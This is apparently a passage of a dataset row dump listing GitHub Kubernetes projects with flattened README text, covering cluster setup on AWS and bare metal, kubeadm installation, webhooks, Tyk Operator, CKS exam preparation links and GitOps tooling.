atoy3731,aws-k8s-terraform,,AWS K8S Terraform This is a project containing Terraform IaC to get a scalable Kubernetes cluster up and running in AWS with ArgoCD deployed to it Prerequisites Terraform CLI An AWS account with Admin Permissions Your AWS credentials configured via Environment Variables or aws credentials file Kubectl CLI How Do I Work It Right now we only support a K3S deployment model using RDS as a backend store Eventually we ll expand to EKS 1 Navigate to the k3s directory bash cd k3s 2 Create an S3 bucket in the AWS console to persist Terraform state This gives you a highly reliable way to maintain your state file 3 Update the bucket entry in both backends s3 tfvars and main tf files with the name of you bucket from the previous step 4 Optional If you want to maintain multiple Terraform states you can create select separate workspaces This will create separate files within your S3 bucket so you can maintain multiple environments at once bash Create a new workspace terraform workspace new staging Or select and switch to an existing workspace terraform workspace select staging 5 Update the example tfvars dbusername The master username for the RDS cluster dbpassword The master password for the RDS cluster you should actually not store this in a file and enter it when you apply your Terraform but leaving it here for simplicity s sake publicsshkey Set this to the public SSH key you re going to use to SSH to boxes It is usually in ssh idrsa pub on your system keypairname The name of the keypair to store your public SSH key keys3bucketname The S3 bucket to store the K3S kubeconfig file NOTE This needs to be GLOBALLY UNIQUE across AWS 6 Initialize Terraform with the S3 backend bash terraform init backend config backends s3 tfvars 7 Apply terraform you ll need to type yes bash terraform apply var file example tfvars 8 Wait until Terraform successfully deploys your cluster a few minutes then run the following to get your Kubeconfig file from S3 bash aws s3 cp s3 YOURBUCKETNAME k3s yaml kube config 9 You should now be able to interact with your cluster via bash kubectl get nodes You should see 6 healthy nodes running unless you ve otherwised specified agent server counts 10 Lastly let s check to make sure your ArgoCD pods are running bash kubectl get deployments n kube system grep argocd You should see all ArgoCD deployments as 1 1 Destroying your cluster To destroy a cluster you need to first go to your AWS console the EC2 service and click on Load Balancers There will be an ELB that the Kubernetes cloud provider created but isn t managed by Terraform that you need to clean up You also need to delete the Security Group that that ELB is using After you ve cleaned the ELB up run the following and type yes when prompted bash terraform destroy var file example tfvars What Next If you re looking to really get into GitOps via ArgoCD check out the demo app https github com atoy3731 k8s tools app for adding a ton of cool tools to this cluster,2020-10-17T19:04:47Z,2020-12-08T03:56:44Z,HCL,User,2,13,9,2,master,atoy3731,1,0,0,0,0,0,0
aws,amazon-vpc-resource-controller-k8s,,amazon vpc resource controller k8s GitHub go mod Go version https img shields io github go mod go version aws amazon vpc resource controller k8s Go Report Card https goreportcard com badge github com aws amazon vpc resource controller k8s https goreportcard com report github com aws amazon vpc resource controller k8s GitHub https img shields io github license aws amazon vpc resource controller k8s style flat Controller running on EKS Control Plane for managing Branch Trunk Network Interface for Kubernetes Pod https kubernetes io docs concepts workloads pods using the Security Group for Pod https docs aws amazon com eks latest userguide security groups for pods html feature This is a new open source project and we are actively working on enhancing the project by adding Continuous Integration detailed documentation and new features to the controller itself We would appreciate your feedback and suggestions to improve the project and your experience with EKS and Kubernetes Usage The ENI Trunking APIs are not yet publicly accessible Attempting to run the controller on your worker node for enabling Security Group for Pod https docs aws amazon com eks latest userguide security groups for pods html or use of aws sdk go from the internal directory for managing Trunk and Branch Network Interface will result in failure of the API calls Please follow the guide https docs aws amazon com eks latest userguide security groups for pods html for enabling Security Group for Pods on your EKS Cluster Windows VPC Resource Controller The controller uses the same name as the controller that manages IPv4 Address for Windows Pods https docs aws amazon com eks latest userguide windows support html running on EKS Worker Nodes However currently the older controller still does IP Address Management for Windows Pods We plan to deprecate the older controller soon and use this controller instead License This library is licensed under the Apache 2 0 License Contributing See CONTRIBUTING md CONTRIBUTING md,2020-09-30T23:11:27Z,2020-12-17T00:04:30Z,Go,Organization,16,13,5,96,master,abhipth#haouc#nithu0115#SaranBalaji90,4,0,0,7,1,1,6
brito-rafa,k8s-webhooks,crd#kubebuilder#webhooks,Kubernetes Custom Resource Definitions and Webhooks This is a repository to give a simple example in how to create a k8s Custom Resource Definition CRD and a controller with webhooks https kubernetes io docs reference access authn authz extensible admission controllers using kubebuilder https go kubebuilder io The example here is a great starting point for you to learn how to validate and mutate your CRDs across multiple API Group Versions https kubernetes io docs concepts overview kubernetes api api groups and versioning and a springboard for a simple controller What are We Trying to Achieve The sample CRD is named rockbands music example io and the controller will be called music Our example sample CRD domain example io group music kind rockband versions v1 and v1alpha1 RockBandv1 Fields Spec Genre Spec NumberComponents Spec LeadSinger and Status LastPlayed RockBandv1alpha1 Fields Spec Genre Spec NumberComponents and Status LastPlayed I created this example to aid the coding of Project Velero to support multiple API Groups during backup and restore https github com vmware tanzu velero issues 2551 The controller itself in this example does not have any busines logic but you will learn the validation and the mutator to support multiple API Group Versions https kubernetes io docs concepts overview kubernetes api api groups and versioning using kubebuilder You will learn how to create the controller and most of all a mutator webhook This is handy in case you already have a CRD in production that require a new schema and you will need to roll out the new schema while supporting the old schema We will see how this is achievable using webhooks and annotations The controller will present the CRs back and forth between versions v1 and v1alpha1 kubectl get crd rockbands music example io NAME CREATED AT rockbands music example io 2020 10 28T19 51 25Z I found easier to code this example in major two steps 1 First Example Creating the first CRD version and validator webhook 2 Second Example Creating the second API Group version and conversion webhook First Example A single Group Version Kind GVK ATTENTION START HERE This is the first example and we will start with one version of the group and kind RockBandv1 Please start at README md single gvk README md Second Example Multiple Group Version Kind GVK This is the second example and it is built upon the first example It creates the RockBandv1alpha1 Please refer at README md multiple gvk README md Other Examples in this Repo I coded many other examples of converting rockbands music example io back and forth to from multiple versions I had to do that for the Velero contribution You can see them at README md examples for projectvelero README md Pre reqs for this Development and Testing Development Software Please see https github com embano1 codeconnect vm operator developer software Kubernetes Cluster For all examples we will use a Kind cluster Please see https github com embano1 codeconnect vm operator kubernetes cluster TLS Cert Manager TLS is a critical component of webhooks You will need cert manager running on your K8s cluster https cert manager io docs installation kubernetes Install it running kubectl apply validate false f https github com jetstack cert manager releases download v1 0 3 cert manager yaml The result should look like this kubectl get pods namespace cert manager NAME READY STATUS RESTARTS AGE cert manager 59dbb7958b t4w68 1 1 Running 0 24s cert manager cainjector 5df5cf79bf j9h8m 1 1 Running 1 24s cert manager webhook 8557565b68 hpp5f 1 1 Running 0 24s If you want you can use the example io self signed yaml other example io self signed yaml file here to test if cert manager is operational You can delete the cert after testing it kubebuilder creates its own kubectl create f other example io self signed yaml issuer cert manager io example io selfsigned created certificate cert manager io example io selfsigned created kubectl get issuers certificates n kube system NAME READY AGE issuer cert manager io example io selfsigned True 32s NAME READY SECRET AGE certificate cert manager io example io selfsigned True example io selfsigned cert tls 32s kubectl delete f example io self signed yaml issuer cert manager io example io selfsigned deleted certificate cert manager io example io selfsigned deleted,2020-10-28T13:24:52Z,2020-12-17T23:40:33Z,Go,User,2,13,1,84,master,brito-rafa,1,1,1,0,2,0,0
zhangshunping,dynamicScheduler,,toc dynamic Scheduler kubernetesnoderequestcpumem dynamic Scheduler https github com zhangshunping dynamicScheduler requestnodepodpod oom requestlimits nodepodpodlimits podpod descheduler https github com kubernetes sigs descheduler deschedulercontrollerpod kubeletmemory available cgroupspodpodgcfree hok sys fs cgroups memorymemory usageinbytes shell memory available node status capacity memory node stats memory workingSet memory availableavailablepodcgroupsmemory availablekubectl top pushGateWaymemory availableprometheus kubeletmemory available https kubernetes io docs tasks administer cluster memory available sh push k8scpumemstatus presurek8spodpresure prometheusk8snodenode prometheus yamlnoderelabelclientgolangPrometheusmetricsstringdynamic scheduler ConvertResultDataType string string valuesinstance pushgatewaycrontabpush shmemory available jobname k8s kubernetessdconfigs role node relabelconfigs sourcelabels metakubernetesnodeaddressInternalIP regex replacement 1 9100 targetlabel address jobname pushgateway honorlabels true staticconfigs targets 172 16 95 4 49091 prometheusnodemetricsk8s nodestatus presure k8s defaultpreferredDuringSchedulingIgnoredDuringExecutionstatus presure shell template metadata labels run nginx spec affinity nodeAffinity preferredDuringSchedulingIgnoredDuringExecution preference matchExpressions key status operator NotIn values presure weight 20 apiserverclientgo informerapiserver promethuesdynamic Scheduler node shell Usage of dynamicScheduler kubeconfig string k8s kubeconfig default root gocode src config prom string prometheus prom http 121 40 XX XX 49090 default http 121 40 XX XX 49090 r string prometheus default rule yaml s int prometheus metrics s 10 default 10 webaddr string webaddr 9000 default 9000 curl ip port status image 20200911120601595 README assets image 20200911120601595 png type presurejson shell curl ip port nodes image 20200911120548684 README assets image 20200911120548684 png,2020-09-01T07:21:35Z,2020-12-14T14:15:57Z,Go,User,1,12,5,9,master,zhangshunping,1,0,0,0,0,0,0
vedmichv,CKS-Certified-Kubernetes-Security-Specialist,cks-exam-preparation#k8s#kubernetes-security,CKS Exam Preparation CKS Exam Preparation cks exam preparation Intro intro Usefull courses usefull courses General security related docs general security related docs Cirriclium Topics cirriclium topics Cluster Setup 10 cluster setup 10 Use Network security policies to restrict cluster level access use network security policies to restrict cluster level access Use CIS benchmark to review the security configuration of Kubernetes components etcd kubelet kubedns kubeapi use cis benchmark to review the security configuration of kubernetes components etcd kubelet kubedns kubeapi Properly set up Ingress objects with security control properly set up ingress objects with security control Protect node metadata and endpoints protect node metadata and endpoints Minimize use of and access to GUI elements minimize use of and access to gui elements Verify platform binaries before deploying verify platform binaries before deploying Cluster Hardening 15 cluster hardening 15 Restrict access to Kubernetes API restrict access to kubernetes api Use Role Based Access Controls to minimize exposure use role based access controls to minimize exposure Exercise caution in using service accounts e g disable defaults minimize permissions on newly created ones exercise caution in using service accounts eg disable defaults minimize permissions on newly created ones Update Kubernetes frequently update kubernetes frequently System Hardening 15 system hardening 15 Minimize host OS footprint reduce attack surface minimize host os footprint reduce attack surface Minimize IAM roles minimize iam roles Minimize external access to the network minimize external access to the network Appropriately use kernel hardening tools such as AppArmor seccomp appropriately use kernel hardening tools such as apparmor seccomp Minimize Microservice Vulnerabilities 20 minimize microservice vulnerabilities 20 Setup appropriate OS level security domains e g using PSP OPA security contexts setup appropriate os level security domains eg using psp opa security contexts Manage Kubernetes secrets manage kubernetes secrets Use container runtime sandboxes in multi tenant environments e g gvisor kata containers use container runtime sandboxes in multi tenant environments eg gvisor kata containers Implement pod to pod encryption by use of mTLS implement pod to pod encryption by use of mtls Supply Chain Security 20 supply chain security 20 Minimize base image footprint minimize base image footprint Secure your supply chain whitelist allowed registries sign and validate images secure your supply chain whitelist allowed registries sign and validate images Use static analysis of user workloads e g Kubernetes resources Docker files use static analysis of user workloads egkubernetes resources docker files Scan images for known vulnerabilities scan images for known vulnerabilities Monitoring Logging and Runtime Security 20 monitoring logging and runtime security 20 Perform behavioral analytics of syscall process and file activities at the host and container level to detect malicious activities perform behavioral analytics of syscall process and file activities at the host and container level to detect malicious activities Detect threats within physical infrastructure apps networks data users and workloads detect threats within physical infrastructure apps networks data users and workloads Detect all phases of attack regardless where it occurs and how it spreads detect all phases of attack regardless where it occurs and how it spreads Perform deep analytical investigation and identification of bad actors within environment perform deep analytical investigation and identification of bad actors within environment Ensure immutability of containers at runtime ensure immutability of containers at runtime Use Audit Logs to monitor access use audit logs to monitor access Uncategorized and questions uncategorized and questions Related links related links Intro In order to take the CKS exam you must have Valid CKA certification to demonstrate you possess sufficient Kubernetes expertise If you do not have passed CKA exam here you find my learn path for that CKALearn https epa ms CKALearn As firt to understand are you for that exam or not plese try to do that tas Securing a Cluster https kubernetes io docs tasks administer cluster securing a cluster of the official K8s documentation Usefull courses Linux Academy Kubernetes Security Advanced Concepts https linuxacademy com cp modules view id 354 Linux Academy Kubernetes Security https linuxacademy com cp modules view id 302 General security related docs K8s Blog 11 Ways Not to Get Hacked GCP GKE General security guide GCP GKE General security overview Cirriclium Topics Cluster Setup 10 Use Network security policies to restrict cluster level access Main doc Main task General practice Official blog post NetworkPolicy API object reference 3rd Party NP Examples Anthos security blueprint Restricting traffic example approaches and implementation steps Good NP description with examples NP best practices Playground Network Policy Visualizer Notes podSelector This selects particular Pods in the same namespace as the NetworkPolicy which should be allowed as ingress sources or egress destinations Use CIS benchmark to review the security configuration of Kubernetes components etcd kubelet kubedns kubeapi 3rd Party CIS Benchmark Kubernetes kubebench CNCF Default GKE cluster results Properly set up Ingress objects with security control Main doc TLS Ingress SSL Ciphers and other SSL settings Main Concept ingress TLS How to deploy NGINX Ingress Controller Main Concept ingress controller multiple controllers Create TLS secret Protect node metadata and endpoints General Kubelet authentication authorization access node info via kubelet API Set Kubelet parameters via a config file 3rd Party Kubelet API Practical Protecting metadata iptables rule GCP specific metadata protection guide Setting up secure endpoints in Kubernetes might be not related Falco webinar just a demo Intro to Falco Intrusion Detection for Containers Shane Lawrence Shopify https youtu be rBqBrYESryY list PLj6h78yzYM2O1wlsM Ma RYhfT5LKq0XC t 1033 Notes yaml egress to ipBlock cidr 0 0 0 0 0 except 169 254 169 254 32 Minimize use of and access to GUI elements Main doc Dashboard Access control Dashboard auth Step by Step 3rd Party Long Read On Securing the Kubernetes Dashboard Verify platform binaries before deploying K8s Releases with SHA checksums 3rd Party sha256sum Cluster Hardening 15 Main doc and beyond 3rd Party Kubernetes RBAC and TLS certificates Kubernetes security guide part 1 Restrict access to Kubernetes API Main doc Cleate Normal User including certificate and its signing by API Different ways for creation certificates easyrsa openssl cfssl 3rd Party Restrict access to API via NP Use Role Based Access Controls to minimize exposure Main doc 3rd Party Practice RBAC PSP NP TLS etc Exercise caution in using service accounts e g disable defaults minimize permissions on newly created ones Main doc Task Service Account use automountServiceAccountToken Default Roles Auth Modules 3rd Party Youtube Understand Role Based Access Control in Kubernetes Get SA token Blogpost series 1 4 A Primer on Kubernetes Access Control 2 4 A Practical Approach to Understanding Kubernetes Authentication 3 4 A Practical Approach to Understanding Kubernetes Authorization 4 4 Kubernetes Access Control Exploring Service Accounts Securing Kubernetes Clusters by Eliminating Risky Permissions Update Kubernetes frequently Main doc kubeadm upgrade Reference kubeadm upgrade System Hardening 15 Minimize host OS footprint reduce attack surface K8s Preventing containers from loading unwanted kernel modules 3rd Party Blogpost Reduce Kubernetes Attack Surfaces CIS Benchmark CIS Distribution Independent Linux Minimize IAM roles 3rd Party Wiki Principle of least privilege Common theory Grant least privilege Minimize external access to the network K8s quotas restrict service loadbalancer Admission control plugin ResourceQuota Restrict Access For LoadBalancer Service 3rd Party Host Level firewall ufw uncomplicated firewall ufw quick start iptables cheat sheet Appropriately use kernel hardening tools such as AppArmor seccomp Main doc apparmor k8s Main doc seccomp k8s Minimize Microservice Vulnerabilities 20 Setup appropriate OS level security domains e g using PSP OPA security contexts PSP Security Context OPA Blog 3rd Party Youtube Intro to OPA Kubernetes security context security policy and network policy Kubernetes security guide part 2 OPA OPA Admission Controller Manage Kubernetes secrets Main doc Secret Encryption etcd Secret Encryption KMS Provider 3rd Party Kubernetes Secrets Store CSI Driver used by 3rd party secret stores such as Vault KeyVault etc Bitnami Sealed Secrets Using secrets Vault Sealed overview Demo for Vault integration Use container runtime sandboxes in multi tenant environments e g gvisor kata containers You can then use policies to enforce tenant isolation Limit Ranges Quotas PSPs You can use Pod anti affinity to prevent Pods from different tenants from being scheduled on the same node 3rd Party GKE Cluster multi tenancy kata containers Kata Containers Docker and Kubernetes How They All Fit Together How to use Kata Containers and CRI containerd plugin with Kubernetes gVisor Step by Step gVisor Implement pod to pod encryption by use of mTLS Main doc 3rd Party Istio Istio Istio Mutual TLS Authentication mTLS De Mystified Supply Chain Security 20 Minimize base image footprint 3rd Party GCP Kubernetes best practices How and why to build small container images GCP Build the smallest image possible GCP Best practices Distroless Docker Images Secure your supply chain whitelist allowed registries sign and validate images Admission controllers One more link 3rd Party OPA registry restriction Container Image Signatures in Kubernetes ImagePolicyWebhook controller itself custom ImagePolicyWebhook controller example Docker content trust Use static analysis of user workloads e g Kubernetes resources Docker files 3rd Party kubesec CNCF kubehunter Online tool kube score Kubernetes static code analysis with Checkov Scan images for known vulnerabilities 3rd Party clair clair Quick Start Scan Your Docker Images for Vulnerabilities Monitoring Logging and Runtime Security 20 Perform behavioral analytics of syscall process and file activities at the host and container level to detect malicious activities Obsoleted 3rd Party Falco CNCF Detect threats within physical infrastructure apps networks data users and workloads 3rd Party Guidance on Kubernetes Threat Modeling Threat matrix for Kubernetes Detect all phases of attack regardless where it occurs and how it spreads 3rd Party Just a concept Investigating Kubernetes Attack Scenarios in Threat Stack part 1 Investigating Kubernetes Attack Scenarios in Threat Stack part 2 Anatomy of a Kubernetes Attack How Untrusted Docker Images Fail Us Perform deep analytical investigation and identification of bad actors within environment 3rd Party Kubernetes Security 101 Risks and 29 Best Practices Ensure immutability of containers at runtime ReadOnlyRootFilesystem securityContext PSP readOnly volume mount 3rd Party Why I think we should all use immutable Docker images With immutable infrastructure your systems can rise from the dead Leveraging Kubernetes and OpenShift to Ensure that Containers are Immutable Use Audit Logs to monitor access Main doc 3rd Party Datadog Step by Step How to monitor Kubernetes audit logs Falco Step by Step Kubernetes Audit Logging Uncategorized and questions Restrict alpha and beta features Solution https kubernetes io docs reference using api api overview enabling or disabling etcd ACL prevent using node selectors via PodNodeSelector Admission Controller prevent kubelet from changing node labels via NodeRestriction Admission Controller Using Node Authorization kubelet permissions Multiple schedulers Konnectivity Related links https k21academy com docker kubernetes certified kubernetes security specialist cks step by step activity guide hands on lab https deploy live blog cks certified kubernetes security specialist exam preparation guide,2020-10-06T17:41:05Z,2020-12-28T15:37:38Z,HTML,User,2,11,8,40,main,siarhei-bareika-ah-nl#vedmichv#hoodbsa,3,0,0,0,0,0,1
onedr0p,k8s-cluster-ubuntu-autoinstall,autoinstall#intel-nuc#ubuntu,Ubuntu autoinstall for my Intel NUCs Project to build custom Ubuntu 20 04 ISOs for my Intel NUCs Using autoinstall https ubuntu com server docs install autoinstall the Ubuntu install will be automated and headless Background Bare metal has it s advantages and disadvantages I own 8 Intel NUCs and needed a quick way to freshly install an OS without mucking with PXE Before I was stuck hooking up a keyboard monitor and USB drive and manually walking thru the install steps in the UI for each NUC Thankfully now I only need a USB drive and the Intel BIOS setting Boot USB devices first enabled Usage Docker will build two ISOs each with slightly different config for my cluster The autoinstall files are in the autoinstall autoinstall directory If you know your NIC interfaces and block devices you want to install Ubuntu on then using my autoinstall files might just work for you too fish Build the docker image to generate the ISOs docker build t autoinstall ubuntu latest Generate the ISOs docker run rm v pwd build build autoinstall ubuntu Flash these ISOs onto a USB thumbdrive insert them into your NUC and reboot In roughly 4 minutes the NUC will poweroff remove the USB thumbdrive and power it back on You should be able to pick up the IP assigned via DHCP in your router settings You may also want to make it staticly assigned in your router https i kym cdn com photos images original 000 634 985 2d7 gif In order to first get the autoinstall files you may want to install Ubuntu Server 20 04 by hand This way you can grab the autoinstall file it automatically generates The file is located under var log installer autoinstall user data It is worth saying however this file may not work right off the bat and may take some tinkering with in order to make it work References Here are some use links that I read thru you may find them useful too https gist github com s3rj1k 55b10cd20f31542046018fcce32f103e https utcc utoronto ca cks space blog linux Ubuntu2004AutoinstFormat https discourse ubuntu com t please test autoinstalls for 20 04 15250 https nickcharlton net posts automating ubuntu 2004 installs with packer html,2020-09-19T17:00:50Z,2020-12-09T08:23:32Z,Shell,User,1,11,0,21,master,onedr0p,1,0,0,0,0,0,0
anthr76,infra,ansible#calico#etcd#flux#fluxcd#git-crypt#k3s#k3s-cluster#k8s#kubernetes#kubernetes-cluster#kubernetes-deployment#longhorn#matchbox#pi-cluster#sealed-secrets#terraform#typhoon,anthr76 infra GitHub issues https img shields io github issues anthr76 infra https github com anthr76 infra issues GitHub stars https img shields io github stars anthr76 infra https github com anthr76 infra stargazers GitHub last commit https img shields io github last commit anthr76 infra pre commit https img shields io badge pre commit enabled brightgreen logo pre commit logoColor white style flat square https github com pre commit pre commit FOSSA Status https app fossa com api projects custom 2B21154 2Finfra svg type shield https app fossa com projects custom 2B21154 2Finfra ref badgeshield This repo contains the code I use for deploying and managing servers my home media services infrastructure monitoring and a bunch of related stuff I use Ansible and Terraform to run my infrastructure and this repo is my contribution to the Infrastructure as Code movement Feel free to open a Github issue https github com anthr76 infra issues new if you have any questions Get involved with the community k8s home https discord gg 5sutTcCav5 SelfHosted https selfhosted show wrench nbsp Tools Below are some of the tools I find useful Tool Purpose git crypt https github com AGWA git crypt Encrypt certain files in my repository that can only be decrypted with a key on my computers pre commit https github com pre commit pre commit Ensure the YAML and shell script in my repo are consistent handshake nbsp Thanks A lot of inspiration for this repo came from the following people billimek k8s gitops https github com billimek k8s gitops carpenike k8s gitops https github com carpenike k8s gitops dcplaya k8s gitops https github com dcplaya k8s gitops rust84 k8s gitops https github com rust84 k8s gitops blackjid homelab gitops https github com blackjid homelab gitops bjw s k8s gitops https github com bjw s k8s gitops toboshii k8s gitops https github com toboshii k8s gitops nlopez k8shome https github com nlopez k8shome ironicbadger inra https github com IronicBadger infra onedr0p k3s gitops https github com onedr0p k3s gitops FOSSA Status https app fossa com api projects custom 2B21154 2Finfra svg type large https app fossa com projects custom 2B21154 2Finfra ref badgelarge,2020-10-06T12:39:02Z,2020-12-29T06:26:35Z,Shell,User,2,11,0,711,main,anthr76#renovate-bot,2,0,0,7,9,0,11
sskcal,kubernetes,,kubernetes https www bilibili com video BV1gy4y1B7LB 132G2CPU30G 2centos 7 x shell 3 hostnamectl set hostname master01 hostnamectl set hostname node01 hostnamectl set hostname node02 masterhosts msster cat etc hosts EOF 192 168 0 200 master01 192 168 0 201 node01 192 168 0 202 node02 EOF msster ssh keygen ssh copy id root node01 ssh copy id root node02 hostsnode0102 msster scp etc hosts root node01 etc hosts scp etc hosts root node02 etc hosts 3 systemctl stop firewalld systemctl disable firewalld selinux 3 sed i s enforcing disabled etc selinux config setenforce 0 swap 3 swapoff a sed ri s swap etc fstab 3 yum install ntpdate y timedatectl set timezone Asia Shanghai ntpdate time windows com Docker shell step 1 sudo yum install y yum utils device mapper persistent data lvm2 Step 2 sudo yum config manager add repo https mirrors aliyun com docker ce linux centos docker ce repo Step 3 Docker CE sudo yum makecache fast sudo yum y install docker ce Step 4 Docker sudo systemctl start docker systemctl enable docker vim etc yum repos d docker ee repo docker ce test enabled 0enabled 1 Docker CE Step 1 Docker CE yum list docker ce x8664 showduplicates sort r Loading mirror speeds from cached hostfile Loaded plugins branch fastestmirror langpacks docker ce x8664 17 03 1 ce 1 el7 centos docker ce stable docker ce x8664 17 03 1 ce 1 el7 centos docker ce stable docker ce x8664 17 03 0 ce 1 el7 centos docker ce stable Available Packages Step2 Docker CE VERSION17 03 0 ce 1 1 el7 centos sudo yum y install docker ce VERSION docker https s2q9fn53 mirror aliyuncs com daemon etc docker daemon json sudo mkdir p etc docker sudo tee etc docker daemon json EOF exec opts native cgroupdriver systemd registry mirrors https s2q9fn53 mirror aliyuncs com EOF sudo systemctl daemon reload sudo systemctl restart docker kubeletkubeadmkubectl kubeadm kubelet pod kubectl kubeadm kubelet kubectl kubeadm kubelet kubelet API 1 7 0 kubelet 1 8 0 API shell kubernetesYUM cat etc yum repos d kubernetes repo kubernetes name Kubernetes baseurl https mirrors aliyun com kubernetes yum repos kubernetes el7 x8664 enabled 1 gpgcheck 1 repogpgcheck 1 gpgkey https mirrors aliyun com kubernetes yum doc yum key gpg https mirrors aliyun com kubernetes yum doc rpm package key gpg EOF yum install y kubelet 1 19 4 kubeadm 1 19 4 kubectl 1 19 4 systemctl enable kubelet systemctl start kubelet Kubernetes Master 192 168 0 200Master shell kubeadm init k8s kubernetes kubeadm config images list sh cat alik8simages sh EOF bin bash list kube apiserver v1 19 4 kube controller manager v1 19 4 kube scheduler v1 19 4 kube proxy v1 19 4 pause 3 2 etcd 3 4 13 0 coredns 1 7 0 for item in list do docker pull registry aliyuncs com googlecontainers item docker tag registry aliyuncs com googlecontainers item k8s gcr io item docker rmi registry aliyuncs com googlecontainers item done EOF bash alik8simages sh k8s kubeadm init apiserver advertise address 192 168 0 200 kubernetes version v1 19 4 service cidr 10 96 0 0 12 pod network cidr 10 244 0 0 16 initialized successfully to start using you cluster you need to run the following as a regular user mkdir p sudo cp sudo chown node kubectl get nodes then you can join any number of worker nodes by running the following on each as root workerrootworker node kubeadm join 192 168 1 200 6443 token Kubeadm init ERROR FileContent proc sys net bridge bridge nf call iptables proc sys net bridge bridge nf call iptables contents are not set to 1 shell echo 1 proc sys net bridge bridge nf call iptables CNI shell flannel docker pull quay io coreos flannel v0 13 1 rc1 kubectl apply f kube flannel yml,2020-12-08T06:51:24Z,2020-12-28T07:30:39Z,Shell,User,2,10,6,15,main,sskcal#CNYuYang,2,0,0,0,1,0,1
TykTechnologies,tyk-operator,api-gateway#k8s#operator-sdk#tyk-operator,Quickstart API Definitions quickstart api definitions Installation installation IDE Integration ide integration Community community Tyk Operator Tyk Operator contains various custom resources and controllers which enable Full Lifecycle API Management with Tyk by extending the Kubernetes API Read more about the concepts here docs concepts md Custom Tyk Objects are available as CRDs https kubernetes io docs concepts extend kubernetes api extension custom resources and documentation for each of these custom resources are available API Definitions docs apidefinitions md WebHooks docs webhooks md Security Policies docs policies md Tyk Operator also contains an Ingress Controller docs ingress md Demo docs img demo svg Quickstart API Definitions HTTP Proxy yaml apiVersion tyk tyk io v1alpha1 kind ApiDefinition metadata name httpbin spec name httpbin usekeyless true protocol http active true orgid acme com proxy targeturl http httpbin org listenpath httpbin striplistenpath true TCP Proxy yaml apiVersion tyk tyk io v1alpha1 kind ApiDefinition metadata name redis tcp spec name redis tcp active true protocol tcp listenport 6380 proxy targeturl tcp localhost 6379 GraphQL Proxy yaml apiVersion tyk tyk io v1alpha1 kind ApiDefinition metadata name trevorblades spec name trevorblades usekeyless true protocol http active true proxy targeturl https countries trevorblades com listenpath trevorblades striplistenpath true graphql enabled true executionmode proxyOnly schema directive cacheControl maxAge Int scope CacheControlScope on FIELDDEFINITION OBJECT INTERFACE enum CacheControlScope PUBLIC PRIVATE type Continent code ID name String countries Country input ContinentFilterInput code StringQueryOperatorInput type Country code ID name String native String phone String continent Continent capital String currency String languages Language emoji String emojiU String states State input CountryFilterInput code StringQueryOperatorInput currency StringQueryOperatorInput continent StringQueryOperatorInput type Language code ID name String native String rtl Boolean input LanguageFilterInput code StringQueryOperatorInput type Query continents filter ContinentFilterInput Continent continent code ID Continent countries filter CountryFilterInput Country country code ID Country languages filter LanguageFilterInput Language language code ID Language type State code String name String country Country input StringQueryOperatorInput eq String ne String in String nin String regex String glob String The Upload scalar type represents a file upload scalar Upload playground enabled true path playground Universal Data Graph Stitching REST with GraphQL yaml apiVersion tyk tyk io v1alpha1 kind ApiDefinition metadata name udg spec name Universal Data Graph Example usekeyless true protocol http active true proxy targeturl listenpath udg striplistenpath true graphql enabled true executionmode executionEngine schema type Country name String code String restCountry RestCountry type Query countries Country type RestCountry altSpellings String subregion String population String typefieldconfigurations typename Query fieldname countries mapping disabled false path countries datasource kind GraphQLDataSource datasourceconfig url https countries trevorblades com method POST statuscodetypenamemappings typename Country fieldname restCountry mapping disabled true path datasource kind HTTPJSONDataSource datasourceconfig url https restcountries eu rest v2 alpha object code method GET defaulttypename RestCountry statuscodetypenamemappings statuscode 200 playground enabled true path playground Installation Installing the tyk operator docs installation installation md tyk operator is under active development We are building the operator to enable you to build and ship your APIs faster and more safely We are actively working on improving stabilising our v1alpha1 custom resources whilst also working on a helm chart so that you can manage your tyk operator deployment If you find any bugs please raise an issue We welcome code contributions as well If you require any features that we have not yet implemented please take the time to write a GH issue detailing your use case so that we may prioritise accordingly IDE Integration This section details the steps required to add K8s extensions to popular IDEs VS Code Watch video tutorial here http www youtube com watch v Kdrfp6aAZEU Steps 1 Go to the following link https marketplace visualstudio com items itemName ms kubernetes tools vscode kubernetes tools 2 Click on Install This will prompt you to open Visual Studios 3 Click Open Visual Studios at the subsequent prompt This will open VS Code and take you to the Extensions section 4 Click Install in the Kubernetes extension page Note The extension should take effect immediately In case it doesn t simply restart VS Code Community Configuring your development environment docs development md Request a feature https github com TykTechnologies tyk operator issues Got an Idea or RFC https github com TykTechnologies tyk operator discussions categories ideas Found a Defect https github com TykTechnologies tyk operator issues Got a Question https github com TykTechnologies tyk operator discussions categories q a Show and Tell https github com TykTechnologies tyk operator discussions categories show and tell,2020-08-17T17:35:48Z,2020-12-24T23:57:25Z,Go,Organization,22,10,2,205,master,asoorm#sedkis#gernest#alephnull#rewsmith#excieve#Jesse0Michael#sredxny#tbuchaillot#hellobudha,10,4,4,29,33,3,159
StarpTech,k8s-gitops,deployment#gitops#infrastructure-as-code#kubernetes#microservices,Helm kbld kapp The GitOps workflow to manage Kubernetes applications at any scale without server components Preface Technology should not make our lives harder Choosing a specific technology should not change the way you do something very basic so drastically that it s harder to use as opposed to easier to use That s the whole point of technology Chris Short This guide describes a CI CD workflow for Kubernetes that enables GitOps https www weave works technologies gitops without relying on server components There are many tools to practice GitOps ArgoCD and FluxCD are the successors of it Both tools are great but come with a high cost You need to manage a complex 130 Open Bugs https github com fluxcd flux issues q is 3Aissue is 3Aopen sort 3Aupdated desc label 3Abug piece of software kubernetes operator in your cluster and it couples you to very specific solutions CRD s https kubernetes io docs concepts extend kubernetes api extension custom resources Additionally they enforce a Pull https www weave works blog why is a pull vs a push pipeline important based CD workflow I can t get used to practicing this flow because it feels cumbersome although I m aware of the benefits Automated updates of images without a connection to your cluster Two way synchronization docker registry config repository Out of sync detection In search of something simpler I found the k14s tools They are designed to be single purpose and composable They provide the required functionality to template build deploy without coupling to full blown community solutions Tools like Helm Kustomize can be easily connected The result is a predictable pipeline of client tools The demo in this repository solves X The entire release can be described declaratively and stored in git X You don t need to run additional software on your cluster X You can easily reproduce the state on your local machine X The CI CD lifecycle is sequential Push https www weave works blog why is a pull vs a push pipeline important based pipeline X No coupling to specific CD solutions Tools can be replaced like lego According to Managing Helm releases the GitOps way https github com fluxcd helm operator get started you need three things to apply the GitOps pipeline model I think we can refute the last point Project structure We consider each directory as a separate repository That should reflect a real world scenario with multiple applications config repository contains all kubernetes manifests release temporary snapshot of the release artifact umbrella chart state yaml app locks image locks to point to a specific version demo service kbld lock yml umbrella chart collection of helm charts which describe the infra charts demo service Chart lock chart lock file to ensure 